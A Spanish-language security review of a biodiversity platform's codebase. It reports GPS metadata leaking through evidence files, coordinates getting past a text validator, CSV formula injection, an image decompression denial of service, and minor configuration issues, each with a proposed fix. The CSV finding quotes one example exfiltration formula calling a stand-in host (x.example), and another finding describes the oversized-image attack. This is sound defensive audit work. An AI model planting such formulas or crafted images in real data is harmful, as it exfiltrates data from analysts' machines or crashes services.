# Revisión 2026-11-19: seguridad

**Revisor:** ciberseguridad · **Rama:** `develop` (HEAD `8d23981`) · **Rango priorizado:** `6a5495a..develop` (70 commits sin contar merges en el log de código; PR #8 a #17)
**Modo:** solo lectura. No se arrancaron servicios ni se ejecutó `mvn` ni `npm install`. No hubo conexión con Aiven.

## Resumen

| Severidad | Nuevos |
|---|---|
| Crítico | 0 |
| Alto | 1 (SEC-R-1) |
| Medio | 2 (SEC-R-2, SEC-R-3) |
| Bajo | 6 (SEC-R-4 a SEC-R-9) |
| Informativo | 4 (SEC-R-I1 a SEC-R-I4) |

**Calificación: 7/10.** **Veredicto: RECHAZADO** por SEC-R-1 (un Alto). Corregirlo es un esfuerzo M, y no hay nada Crítico.

El portal público, la API externa, el catálogo por especie, las fotos públicas (D65), los CSV/PDF y las teselas **no filtran coordenadas exactas**. La foto pública se vuelve a codificar y sale sin metadatos. La fuga está **dentro** de la plataforma: la evidencia original que se guarda en disco (D62) conserva la ubicación GPS en dos casos: el audio, que no se limpia, y los datos que vienen después del primer escaneo de un JPEG. Esa evidencia la descargan `administrador`, `auditor_cientifico` e `investigador_campo`, roles que según RF12/D21 nunca reciben coordenadas. Además queda en disco sin cifrar, en contra de D15. D62 da el problema por resuelto ("Cumple RF1 sin abrir una fuga de coordenadas"), y no lo está.

### Cómo se revisó
- **Documentación:** `00-alcance.md`, `08-reporte-seguridad.md` (todas las iteraciones), `11-seguridad-y-acceso.md`, decisiones D14–D65 de `03-arquitectura.md` y el contrato.
- **Código nuevo (estático):** evidencias (`EvidenciaController`, `EvidenciaService`, `LimpiadorMetadatos`, `TipoArchivoEvidencia`, `AlmacenEvidenciasDisco`), fotos públicas (`FotoPublicaController`, `FotoPublica`, `FotosCientificoHttp`, `FotosEspeciesService`), catálogo (`CatalogoEspeciesJdbc`, `BusquedaEspeciesJdbc`, `EspeciesController`, `EspeciesPublicasController`), `SecurityConfig` de los 5 módulos, registro (`HallazgoService`, `FichaPlantillaService`, `ValidadorTextoPublico`, `ConstructorSnapshotPublico`), reportes (`SolicitudesReporteService`, `ConsultasReportesService`, `PdfPresion`, `ReportesController`, `ProyectorHallazgosService`), equipos (`GatewayCustodioAdapter`, controlador y manejador de errores), gateway (`SecurityConfig`, teselas), web-interna (cliente HTTP, `permisos.js`, `Foto.jsx`, páginas de API Keys y usuarios), web-publica (CSP, `FotoEspecie.jsx`), tema de Keycloak, realm, `docker-compose.yml`, `crear-usuarios.sh`, `levantar.ps1`/`.cmd` y `scripts/sembrar-demo.mjs`.
- **Pruebas locales sin servicios (en el scratchpad, fuera del repo):**
  1. Se compiló con `javac` una **copia** de `LimpiadorMetadatos`, con un stub de la excepción, para probar qué metadatos sobreviven (resultado en SEC-R-1).
  2. Se ejecutaron los patrones de `ValidadorTextoPublico` con `java` sobre seis textos (resultado en SEC-R-2).
- **XSS:** búsqueda de `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `eval`, `divIcon` con HTML, `href` dinámico y `localStorage`. No hay coincidencias explotables.
- **Secretos:** `git ls-files` y `git log --all --diff-filter=A` buscando `.env`, `*.pem`, `*.key`, `*.p12`, `*.jks` y `certs/`. También `git log --all -p` con patrones `AVNS_`, claves privadas, certificados, `ghp_`, `AKIA` y `UBICACION_CLAVES=v1:<base64>`, y `git log -p 6a5495a..develop` con asignaciones `password|secret|clave|token` (salida enmascarada). **No hay secretos reales.** Solo están versionados los `.env.example`, con valores `CAMBIAR`/`cambiar_*`, y los `.env.development` de las webs, que no tienen secretos. `certs/` y `**/datos/evidencias/` están ignorados. No se leyeron `.env` ni `certs/`.
- **Dependencias:** `npm audit --omit=dev` en web-interna y web-publica (los `node_modules` ya existían) da **0 vulnerabilidades** en ambas. Las dependencias nuevas son `react-router` 8.5, `lucide-react`, `@fontsource-variable/*` y `@playwright/test` (dev). En Maven solo entra `testcontainers:mysql` (test). Boot sigue en 3.5.16. No hay escáner de CVE para Maven (sigue SEC-15).

---

## Hallazgos

### SEC-R-1 · **Alto** · A01/A02 (RNF9, RF12, D15, D21): la limpieza de metadatos de evidencias (D62) deja pasar la ubicación GPS
- **Archivos:**
  - `servicio-cientifico/.../registro/service/LimpiadorMetadatos.java:33`: `default -> datos;`. WAV, MP3, OGG y FLAC se guardan **sin tocar**.
  - `LimpiadorMetadatos.java:71-75`: al llegar al SOS, `salida.write(d, i, d.length - i)` copia **todo lo que queda** del archivo.
  - `TipoArchivoEvidencia.java:159-162`: acepta los 4 formatos de audio.
  - `EvidenciaController.java:74-85`: descarga del original para `investigador_campo`, `auditor_cientifico`, `cientifico_alto_rango` y `administrador`.
  - `03-arquitectura.md:109` (D62).
- **Problema** (comprobado con la copia compilada del limpiador):
  - Un JPEG con una **segunda imagen MPF** después del primer EOI conserva su APP1/EXIF. MPF es la vista previa o el mapa de ganancia HDR de muchos teléfonos y cámaras. Resultado: `MPF secundaria sobrevive: true`.
  - Un **trailer** después del EOI también se conserva. Por ejemplo, el MP4 de un "Motion Photo" de Pixel o Samsung, con su átomo de ubicación `©xyz`. Resultado: `trailer motion photo sobrevive: true`.
  - Un WAV con un bloque **GUANO** (`Loc Position: lat lon`) queda igual. Ese bloque lo escriben las grabadoras bioacústicas habituales en campo: Song Meter, AudioMoth con GPS y detectores de murciélagos. Lo mismo pasa con `wamd`, ID3v2 en MP3, `VORBIS_COMMENT` en FLAC y OGG, `LIST/INFO` y `bext`/`iXML` en WAV. Resultado: `WAV GUANO sobrevive: true`.
  - El EXIF del JPEG principal **sí** se elimina (`principal sobrevive: false`).
- **Por qué importa:** es el activo central del sistema. Ocurre **sin atacante**: basta con subir la foto de un teléfono o la grabación de un equipo de campo.
  1. La coordenada exacta queda **en claro en disco**, fuera del cifrado AES-GCM (D15) y de la auditoría D28.
  2. La recibe en cada descarga un `administrador` o un `auditor_cientifico`, a quienes RF12 y D21 se lo prohíben.
  3. D62 descartó WEBP, HEIC y M4A justamente "porque pueden traer ubicación", pero aceptó audio que también la trae.
  - La foto **pública** no se ve afectada: `FotoPublica.reducir` vuelve a codificar los píxeles con ImageIO y no conserva metadatos.
- **Corrección:**
  1. **JPEG:** recorrer los marcadores también después del SOS y **cortar en el primer EOI**. En los datos de entropía, `0xFF` siempre va seguido de `00` o de un RST (D0–D7). Entre escaneos progresivos se conservan solo DHT, DQT, DRI y SOS, y se quitan APPn y COM. Lo que vaya después del EOI se descarta. Alternativa: rechazar el archivo si hay bytes después del EOI.
     ```java
     if (marcador == 0xDA) {                    // SOS: copiar datos de entropía hasta el siguiente marcador real
         salida.write(0xFF); salida.write(marcador); salida.write(d, i, largo); i += largo;
         while (i < d.length) {
             if ((d[i] & 0xFF) == 0xFF && i + 1 < d.length) {
                 int m = d[i + 1] & 0xFF;
                 if (m == 0x00 || (m >= 0xD0 && m <= 0xD7)) { salida.write(d, i, 2); i += 2; continue; }
                 break;                         // otro marcador: vuelve al bucle externo (DHT, SOS o EOI)
             }
             salida.write(d[i++]);
         }
         continue;
     }
     if (marcador == 0xD9) { salida.write(0xFF); salida.write(0xD9); return salida.toByteArray(); } // trailer descartado
     ```
  2. **PNG:** pasar a **lista permitida** de bloques (`IHDR`, `PLTE`, `IDAT`, `IEND`, `tRNS`, `gAMA`, `cHRM`, `sRGB`, `iCCP`, `sBIT`, `pHYs`, `bKGD`) en lugar de la lista negra actual. Hoy pasan bloques privados como `caBX` (C2PA, que puede llevar ubicación).
  3. **Audio:** limpiar con lista permitida o rechazar el formato.
     - WAV: conservar solo `fmt `, `fact` y `data`.
     - FLAC: conservar solo `STREAMINFO`, `SEEKTABLE` y `PADDING`.
     - MP3: quitar ID3v2, ID3v1 y APE, y verificar que lo que queda empiece con una sincronía de trama.
     - OGG: si no se puede re-empaquetar, **dejar de aceptarlo**, con el mismo criterio que se usó con M4A.
  4. Pruebas en `LimpiadorMetadatosTest` con un MPF, un trailer después del EOI, un WAV con `guan`, un FLAC con `VORBIS_COMMENT` y un MP3 con `TXXX`.
  5. Las evidencias que ya están guardadas se deben volver a procesar (`EVIDENCIAS_DIR`) o revisar, y hay que actualizar el texto de D62.
- **Esfuerzo:** M · **Responsable:** dueño de registro/evidencias (D62, Santiago), con revisión de ciberseguridad.

### SEC-R-2 · **Medio** · A04 (RNF9, D15, D21): coordenadas escritas a mano en texto libre y en atributos dinámicos se guardan en claro y se muestran a roles sin permiso
- **Archivos:**
  - `servicio-cientifico/.../registro/service/ValidadorTextoPublico.java:23-24` (solo acepta el punto como decimal), `:35-36` y `:48-52`: si el texto contiene **cualquier** unidad (`m`, `cm`, `km`, `g`, `%`), el par decimal ya no se considera coordenada.
  - `FichaPlantillaService.java:147-150`: los atributos `TEXTO` solo se validan como `String` y nunca pasan por el validador.
  - `FichaPlantillaService.java:31`: una plantilla puede definir claves como `latitud_gps` de tipo `NUMERO`.
  - `HallazgoService.java:259-265`: no verifica `atributos`.
- **Problema** (prueba con `java` sobre los patrones copiados). Todos estos textos pasan el validador de registro:

  | Texto | Resultado |
  |---|---|
  | `colectado en 5.53214, -73.36712, ejemplar de 12 cm` | no detectado |
  | `colectado en 5,53214 -73,36712` (coma decimal, lo normal en español) | no detectado |
  | `lat 5.53214 lon -73.36712` | no detectado |
  | `4.6097, -74.0817 (a 100 m del camino)` | no detectado |

  El portal sigue protegido porque `DetectorCoordenadas` de consulta-publica es más estricto y rechaza el evento. Pero el texto ya quedó guardado en `hallazgo.descripcion`, en los atributos y en el historial **append-only**, donde no se puede borrar (D60). Desde ahí se muestra en `GET /hallazgos/{id}` y en `comparar` a `administrador` y `auditor_cientifico`. Además el hallazgo desaparece del portal sin ningún aviso al investigador.
- **Por qué importa:** es la fuga más probable por error humano (SEC-J-02 ya lo anticipaba). Hoy la primera barrera es más débil que la segunda, y la segunda llega tarde: el dato ya se escribió de forma permanente.
- **Corrección:**
  1. Sacar `DetectorCoordenadas` de consulta-publica a una utilidad que registro copie (D4: sin módulo común; mantener las dos copias iguales con una prueba de paridad) y usarla en `ValidadorTextoPublico`. Quitar el atajo de "cualquier unidad en el texto": la unidad debe ir **pegada al número** (`\d[\d.,]*\s*(msnm|m|cm…)\b`).
  2. Validar con el mismo detector cada valor `TEXTO` de `atributos` y **prohibir claves de plantilla** que nombren coordenadas:
     ```java
     private static final Pattern CLAVE_COORDENADA = Pattern.compile("(^|_)(lat|latitud|latitude|lon|lng|long|longitud|longitude|coord|coordenadas|gps|utm|geo)(_|$)");
     if (CLAVE_COORDENADA.matcher(atributo.clave()).find() && atributo.tipo() == TipoAtributo.NUMERO) {
         throw new DatosHallazgoInvalidosException("atributos." + atributo.clave(), "las coordenadas van en latitud/longitud del hallazgo, cifradas");
     }
     ```
     `longitud_hocico` del ejemplo es legítimo. Hay que exigir el contexto (`_gps`, o `NUMERO` sin unidad de longitud) o decidir con el grupo.
  3. Prueba parametrizada con los cuatro textos de la tabla.
- **Esfuerzo:** S–M · **Responsable:** registro (Hernando/Santiago), con la guía de Juanita (dueña del detector).

### SEC-R-3 · **Medio** · A03 (inyección CSV): la exportación `/api/reportes/exportar/csv` no neutraliza fórmulas
- **Archivos:** `servicio-reportes/.../service/ConsultasReportesService.java:151-159` (`escaparCsv`: solo comillas) y `:74-83` (columnas `nombreCientifico`, `nombreComun`, `familia`, `tipoEspecimen`, `departamento`, `region`). Endpoint en `ReportesController.java:56-67`.
- **Problema:** esos textos los escribe cualquier `investigador_campo` y llegan por evento a la base analítica. Registro solo limita su longitud. Un `nombreComun` como `=HYPERLINK("https://x.example/?d="&A2;"ver")` o `@SUM(…)` se exporta tal cual, y el analista lo abre con doble clic en Excel. El reporte mensual nuevo (`SolicitudesReporteService.celda`, `:185-192`) sí antepone `'` a `= + - @`, pero no cubre los que empiezan con tabulador o `\r` (OWASP), y la exportación antigua no tiene ninguna protección.
- **Por qué importa:** un usuario interno de menor privilegio ataca el equipo del analista o del administrador: exfiltración con HYPERLINK o WEBSERVICE, o DDE en Excel sin parches.
- **Corrección:** una sola función para los dos CSV:
  ```java
  static String celdaSegura(String v, char sep) {
      if (v == null) return "";
      if (!v.isEmpty() && "=+-@\t\r".indexOf(v.charAt(0)) >= 0) v = "'" + v;
      boolean comillas = v.indexOf(sep) >= 0 || v.contains("\"") || v.contains("\n") || v.contains("\r");
      return comillas ? "\"" + v.replace("\"", "\"\"") + "\"" : v;
  }
  ```
  Más una prueba con `=1+1`, `+cmd`, `@SUM(A1)` y `\t=1`. Opcional: en registro, rechazar nombres que empiecen con esos caracteres.
- **Esfuerzo:** S · **Responsable:** reportes (Nicolás).

### SEC-R-4 · Bajo · A04 (DoS por descompresión): `FotoPublica` decodifica la imagen completa sin límite de píxeles
- **Archivos:** `servicio-cientifico/.../registro/service/FotoPublica.java:129` (`ImageIO.read`), `EvidenciaService.java:150` (solo captura `IOException`/`UncheckedIOException`), `FotosEspeciesService.java:158-196`.
- **Problema:** un PNG de menos de 9 MB puede declarar 40 000 × 40 000 px. `ImageIO.read` reserva el raster entero (unos 4,8 GB en ARGB) y se produce un `OutOfMemoryError` en el servicio científico. Lo dispara un visitante anónimo vía `/api/publica/especies/foto` cuando la foto ya está marcada como pública. La caché de consulta-publica tiene 120 entradas sin coalescencia, y nombres válidos inventados la vacían, lo que fuerza a re-decodificar.
- **Corrección:** leer las dimensiones con `ImageReader` (`getWidth(0)`/`getHeight(0)`) antes de decodificar, rechazar más de 40 MP (y también **al subir**), y usar `ImageReadParam.setSourceSubsampling` para reducir mientras se lee. Guardar la versión reducida una sola vez al marcar `publica=true`, en lugar de recalcularla en cada fallo de caché.
- **Esfuerzo:** S · **Responsable:** registro (D65).

### SEC-R-5 · Bajo · A01/A09: publicar una foto no tiene más control que el rol, y no queda en el historial
- **Archivos:** `EvidenciaController.java:88-95` y `EvidenciaService.java:126-136`.
- **Problema:** cualquier `investigador_campo` puede publicar **cualquier** foto de **cualquier** hallazgo, aunque la haya subido otra persona y aunque la especie esté `EN_PELIGRO`. El único rastro es una línea de log. El cambio no entra en `hallazgo_auditoria` (append-only, D60). D65 acepta que "quien publica debe revisar que no muestre el lugar", pero no hay ni una segunda mirada ni una traza en la base.
- **Corrección:** para especies `EN_PELIGRO`, exigir `cientifico_alto_rango` para `publica=true`, o un flujo de aprobación. Registrar la marca en `hallazgo_auditoria` (quién, cuándo, evidencia). Opcional: que solo el autor de la evidencia o el alto rango puedan publicar.
- **Esfuerzo:** S · **Responsable:** registro / producto (decisión del grupo).

### SEC-R-6 · Bajo · A05: la única ruta anónima del científico depende solo del aislamiento de red
- **Archivo:** `servicio-cientifico/.../config/SecurityConfig.java:41` (`permitAll` en `/api/cientifico/publico/especies/foto`) y `FotoPublicaController.java:33-46`.
- **Problema:** está bien en local (`SERVER_ADDRESS=127.0.0.1`, y el gateway exige rol). Pero el propio `application.yml` indica `SERVER_ADDRESS=0.0.0.0` en contenedores, y ahí cualquier proceso de la red llega sin token y **sin el límite por IP del gateway**. Esa ruta además dispara la decodificación de SEC-R-4.
- **Corrección:** una credencial de servicio sencilla, por ejemplo una cabecera `X-Interno` con un secreto compartido del `.env` comparado con `MessageDigest.isEqual`, o mTLS cuando se contenerice. Como mínimo, documentarlo como requisito en el compose futuro (`11` §6).
- **Esfuerzo:** S · **Responsable:** registro + devops.

### SEC-R-7 · Bajo · A05/A02: `levantar.ps1` muestra en pantalla la contraseña de los usuarios de prueba y pasa todo el `.env` a todos los procesos
- **Archivos:** `levantar.ps1:289-291` (`Write-Host $clave`) y `:396-397` (`foreach … Set-Item env:$k`, del que heredan Docker, los 5 servicios y los `npm run dev`).
- **Problema:** la contraseña común de los usuarios de prueba, incluido `admin1` con rol `administrador`, queda en el historial de la consola y en grabaciones de pantalla de la sustentación. Los procesos de Node (dependencias de Vite) y cada servicio reciben todas las contraseñas root y la llave `UBICACION_CLAVES`. Esto sigue abierto desde SEC-12 y ahora lo hace el propio script.
- **Corrección:** mostrar `(la de KEYCLOAK_TEST_USERS_PASSWORD en tu .env)` y nunca el valor. Pasar a cada proceso solo sus variables (`Start-Process` con un entorno filtrado por prefijo), y a las webs solo `VITE_*`.
- **Esfuerzo:** S · **Responsable:** devops / Santiago.

### SEC-R-8 · Bajo · A05: web-interna sigue sin CSP (SEC-J-07)
- **Archivo:** `web-interna/index.html` (sin `<meta http-equiv="Content-Security-Policy">`). web-publica sí la tiene, actualizada para las fotos (`img-src … %CONNECT_SRC%`).
- **Problema:** la web interna maneja el JWT y las coordenadas del mapa, y es la que más necesita CSP. React escapa la salida y no se encontró ningún sink, así que hoy esto es solo defensa en profundidad.
- **Corrección:** el mismo plugin de web-publica, con `script-src 'self'; connect-src 'self' <gateway> <keycloak>; img-src 'self' data: blob:; frame-src <keycloak>; object-src 'none'; base-uri 'self'` (ver `11` §7).
- **Esfuerzo:** S · **Responsable:** frontend.

### SEC-R-9 · Bajo · A04: SEC-J-17 sigue abierto y registro ya publica `hallazgo.*` reales
- **Archivos:** el publicador de `servicio-cientifico/.../eventos` no cambió desde `786f4e1`. La condición previa de la iteración 16 era cerrar SEC-J-17 antes de publicar eventos reales.
- **Mitigación actual:** `ConstructorSnapshotPublico.java:41-52` arma el evento con una **lista fija** de campos de texto, sin números de coordenada, y consulta-publica valida con `DetectorCoordenadas`. Por eso el riesgo real es bajo.
- **Corrección:** la indicada en SEC-J-17: normalizar con `ObjectMapper` y lista permitida de §7.3 en el publicador.
- **Esfuerzo:** S · **Responsable:** Juanita (D54).

### Informativos
- **SEC-R-I1:** `EquiposExceptionHandler.java:34-37` devuelve `ex.getMessage()` de `MethodArgumentTypeMismatchException` e `IllegalArgumentException`, que incluye nombres de tipos Java. Solo lo ve un administrador. Usar un mensaje fijo.
- **SEC-R-I2:** `ProyectorHallazgosService.java:50-53,67-71` (reportes) solo busca claves de coordenadas si `EN_PELIGRO`. No tiene impacto porque la proyección guarda campos fijos, pero conviene alinearlo con D14 (todas las especies) o quitar la comprobación para que no dé una falsa garantía.
- **SEC-R-I3:** `GET /api/reportes/hallazgos` y `/exportar/csv` cargan todas las filas sin paginar (`ConsultasReportesService.listarDetalle`). Con 10⁵–10⁶ filas, un analista puede tumbar el servicio. Poner un tope o paginar.
- **SEC-R-I4:** equipos y reportes no usan `ProblemaSeguridadHandler`, así que su 401/403 no es problem+json `ROL_INSUFICIENTE` (la misma inconsistencia que SEC-J-20 en los otros servicios).

---

## Respuesta a las preguntas del pedido

| Pregunta | Respuesta |
|---|---|
| ¿La validación de coordenadas exactas está centralizada y es infalible? | **En lo que se cifra, sí:** `PoliticaAccesoUbicacion` + `ServicioDescifrado` + ArchUnit (D21/D44), y no hubo cambios en este rango. **Pero las coordenadas no solo entran por `latitud`/`longitud`:** también por los metadatos de evidencias (SEC-R-1), el texto libre y los atributos (SEC-R-2). Esas vías no pasan por la política. |
| ¿Fotos públicas, EXIF, catálogo, CSV, PDF, teselas o búsqueda filtran coordenadas al público? | **No.** La foto pública se vuelve a codificar sin metadatos (`FotoPublica`). El catálogo público y el interno usan departamento/región (D14). El CSV y el PDF solo agregan por departamento. Las teselas pasan por el gateway con JWT (D56/D57). La búsqueda pública no tiene coordenadas. El texto libre lo frena `DetectorCoordenadas` de consulta-publica. |
| IDOR | Las evidencias se buscan por `(hallazgoId, evidenciaId)` y la de otro hallazgo da 404 (`EvidenciaService.obtener`). Los reportes son compartidos por diseño entre analista y admin. Equipos es solo para administrador. Publicar una foto no comprueba la autoría (SEC-R-5). |
| JWT gateway y servicios | Sin cambios. Los 5 validan firma, `iss`, `exp` y `aud`. Los 4 servicios tienen `denyAll` por defecto (equipos y reportes ya lo tienen: SEC-02 cerrado). |
| Subida de archivos | Tipo por magic bytes, 9 MB en el servicio y 10 MB en el gateway, nombre en disco por UUID con `normalize()` y `startsWith(base)`, descarga como `attachment` con `nosniff` y `no-store`. La falla está en el contenido (SEC-R-1) y en el tamaño en píxeles (SEC-R-4). |
| Inyección SQL | Todas las consultas nuevas usan parámetros enlazados. Lo único concatenado son los marcadores `?` y fragmentos fijos. `LIKE` escapa `\ % _`. |
| SSRF | No hay. `FotosCientificoHttp` y `GatewayCustodioAdapter` usan una URL de configuración y variables de plantilla codificadas. |
| XSS | Sin sinks. Las fotos se cargan como `blob:` en `<img>`. El tema de Keycloak solo asigna `backgroundImage` con rutas fijas. |
| Rate limiting / API Keys | Sin cambios. Las rutas nuevas `/api/publica/especies/**` caen en el límite por IP del portal. |
| Secretos e historial | Limpios (ver "Cómo se revisó"). |
| CORS / cabeceras | Sin cambios en el gateway (lista explícita, `allowCredentials(false)`). Falta la CSP de web-interna (SEC-R-8). |
| Logs | `EvidenciaService` registra ids y el usuario, no contenido ni nombres de archivo. `FotosCientificoHttp` no registra el nombre consultado. |

---

## Estado de hallazgos previos

| ID | Estado | Evidencia |
|---|---|---|
| SEC-02 (equipos, reportes) | **Cerrado** | `denyAll` + `hasAnyRole` en la URL y `@PreAuthorize("hasRole('administrador')")` en la clase (equipos) y por clase/método (reportes) |
| SEC-04 / SEC-D-03 | **No verificable de forma estática** | Infraestructura lista (`crear-usuarios.sh`, ahora también con `biohub.reportes`). La migración real depende de los `.env` locales, que no se leen |
| SEC-11 | **Parcial → mejorado** | `levantar.ps1:417-423` separa `*_MIGR_PASSWORD` para Aiven. En local, un solo usuario (D60 lo acepta) |
| SEC-12 | **Abierto** y agravado por `levantar.ps1` | SEC-R-7 |
| SEC-15 | **Abierto** | No hay escáner de CVE para Maven. npm: 0 |
| SEC-J-02 | **Parcial** | Ya existe validación en origen (`ValidadorTextoPublico`), pero se elude: SEC-R-2 |
| SEC-J-07 | **Parcial** | web-publica con CSP. web-interna sin CSP (SEC-R-8) |
| SEC-J-17 | **Abierto** | SEC-R-9 |
| SEC-J-18 | **Abierto** | `logback-spring.xml` sin cambios en el rango |
| SEC-J-25 (bfcache) | **Abierto** | No hay manejador `pageshow`/`persisted` en web-interna |
| SEC-J-I25 (tipo de blob en teselas) | **Abierto** (informativo) | Sin cambios |
| Requisito "Archivos subidos" de `08` §Requisitos | **Parcial** | Tamaño, magic bytes, UUID, `attachment` y `nosniff` cumplidos. "Quitar EXIF/GPS" incompleto (SEC-R-1) |

---

## Bien hecho
- **D65 con privacidad por defecto:** ninguna foto es pública hasta que alguien lo decide, solo pueden serlo fotografías (nunca audio), y la copia pública se **vuelve a codificar** a 1200 px en JPEG. Así ningún metadato del original, ni siquiera los de SEC-R-1, llega al portal.
- **Subida de archivos sólida en lo estructural:** tipo por contenido, tope coherente con el gateway (9/10 MB, `resolve-lazily` para dar un 413 limpio), ruta solo con UUID y comprobación de `normalize()`/`startsWith`, escritura atómica (temporal + `ATOMIC_MOVE`), deduplicación por SHA-256, nombre visible saneado y nunca usado como ruta, `Content-Disposition` con RFC 6266, `nosniff` y `no-store`. La ruta interna nunca sale en la respuesta.
- **El detector de consulta-publica** (`DetectorCoordenadas`) es robusto (coma decimal, palabras clave, cuantificadores acotados contra ReDoS) y protege el portal aunque falle el de origen.
- **Control de acceso coherente con la matriz** `11` §2 en los endpoints nuevos (especies, sugerencias, evidencias, publicar, reportes asíncronos, equipos), y las excepciones explícitas están registradas en `ArquitecturaSeguridadTest`/`TodosLosEndpointsExigenRolTest`.
- **SQL nuevo siempre parametrizado**, también en las consultas agregadas con `IN (?, …)`.
- **CSV del reporte mensual** ya con protección contra fórmulas y BOM para Excel. **PDF** generado a mano con escape correcto de `\ ( )`.
- **Caché de fotos acotada** (120 entradas, TTL distinto para "sin foto") y caché Redis con DTOs tipados, sin tipado polimórfico.
- **Web interna:** token solo en memoria, `credentials: 'omit'`, `cache: 'no-store'`, la API Key y la contraseña temporal se muestran una vez y no se guardan, y el menú por rol es solo de presentación (está documentado que autoriza el backend).
- **Keycloak:** `editUsernameAllowed: false` (sostiene D59). El tema solo cambia CSS y un script con rutas fijas, sin CDN.
- **`levantar.ps1`** genera la llave AES con `RNGCryptoServiceProvider` (32 bytes) y se niega a inventarla en el perfil `aiven`.
- **Repositorio sin secretos** y `.gitignore` que cubre `certs/`, llaves, `logs/` y `**/datos/evidencias/`.

---

## Veredicto

**RECHAZADO** (calificación **7/10**), por un único Alto:

- **SEC-R-1** (Alto, M): GPS en audio y después del primer escaneo de un JPEG en las evidencias guardadas y descargables por roles sin permiso. Hay que corregirlo antes de la sustentación, o como mínimo dejar de aceptar audio y cortar el JPEG en el EOI (S), y actualizar D62.
- **Antes de usar datos reales:** SEC-R-2 y SEC-R-3 (Medios, S).
- **Pueden ir en la siguiente iteración:** los Bajos.

Con SEC-R-1 corregido y probado, el veredicto pasaría a **Aprobado con observaciones**.
